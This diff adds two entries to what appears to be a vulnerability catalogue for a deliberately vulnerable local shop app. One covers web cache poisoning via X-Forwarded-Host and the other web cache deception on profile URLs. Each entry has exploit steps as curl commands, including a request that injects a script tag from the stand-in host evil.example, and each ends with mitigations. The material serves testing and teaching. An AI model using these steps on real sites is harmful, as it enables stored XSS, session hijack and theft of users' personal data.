@@ -410,6 +410,83 @@ V-SHOP-102  Blind deserialization on /cart/import (no output reflected)
 
 
 -----------------------------------------------------------------
+WEB CACHE POISONING & DECEPTION
+-----------------------------------------------------------------
+
+V-SHOP-110  Cache poisoning via unkeyed X-Forwarded-Host on /products
+  Location:  lib/cache.js (cache key is METHOD + URL only — does not
+             include Vary, Cookie, or any Host header) plus
+             routes/products.js + views/partials/header.ejs (the
+             X-Forwarded-Host value reaches the rendered HTML through
+             res.locals.canonicalHost and is emitted as
+             <script src="//<host>/static/js/track.js">).
+  Exploit:
+    Step 1 - poison the cache slot for /products with attacker-controlled host:
+
+      $u = '/products?_v=' + (Get-Random)
+      curl -i ("http://127.0.0.1:3002" + $u) `
+           -H "X-Forwarded-Host: evil.example"
+
+             The first response is X-Cache: MISS and the rendered HTML
+             contains <script src="//evil.example/static/js/track.js">.
+
+    Step 2 - every subsequent visitor (within the 30 s TTL) requesting
+             the same URL receives the poisoned response from cache.
+             The X-Cache: HIT header confirms the cache served the
+             attacker payload:
+
+      curl -i ("http://127.0.0.1:3002" + $u)
+
+             Response body contains attacker's script tag; victims'
+             browsers fetch and execute evil.example/static/js/track.js.
+
+  Impact:    Stored XSS for every visitor of /products for the TTL.
+             Combine with an attacker-controlled host that serves
+             arbitrary JS for site-wide credential theft, session
+             hijack, or arbitrary admin actions via the victim's cookies.
+  Mitigation: include Vary: X-Forwarded-Host in the cache key, or
+              never reflect proxy headers into HTML, or normalize host
+              to a known value before rendering.
+
+V-SHOP-111  Web cache deception of /profile/:anything (Omer Gil 2017 class)
+  Location:  routes/profile.js (router.get('/profile/:anything', ...))
+             accepts any suffix and renders the logged-in user's profile;
+             lib/cache.js force-caches URLs ending in .css/.js/.png/.svg/.ico
+             for 60 s regardless of Cache-Control.
+  Exploit:
+    Step 1 - attacker tricks a logged-in victim into visiting
+
+      https://127.0.0.1:3002/profile/anything_<rand>.css
+
+             (links from a phishing email, attacker page, or XSS).
+
+    Step 2 - the victim's authenticated request reaches the origin,
+             which renders the victim's profile HTML. The cache
+             middleware sees the .css suffix and stores the response
+             under the URL key. Cookie is NOT in the cache key.
+
+    Step 3 - attacker (no session) requests the same URL:
+
+      curl http://127.0.0.1:3002/profile/anything_<rand>.css
+
+             Response is the victim's profile HTML, served from cache.
+             X-Cache: HIT confirms the cache serviced the request.
+
+  Impact:    Public disclosure of every user's profile (email, address,
+             full name, profile JSON) any time the attacker can lure
+             them to a deceptive URL. With sensitive endpoints
+             (statements, orders, API keys), full PII/financial leak.
+  Mitigation:
+    1. The origin must refuse path suffixes it did not advertise (a
+       canonical 404 for /profile/anything.css).
+    2. The cache must consider Set-Cookie / Cache-Control headers and
+       refuse to store responses that carry per-user state.
+    3. The cache must key on the Cookie header (or at least the
+       presence of an Authorization / session cookie) when the
+       upstream response contains user-private data.
+
+
+-----------------------------------------------------------------
 EXPLOIT QUICK-REFERENCE (PowerShell 5.1)
 -----------------------------------------------------------------
 
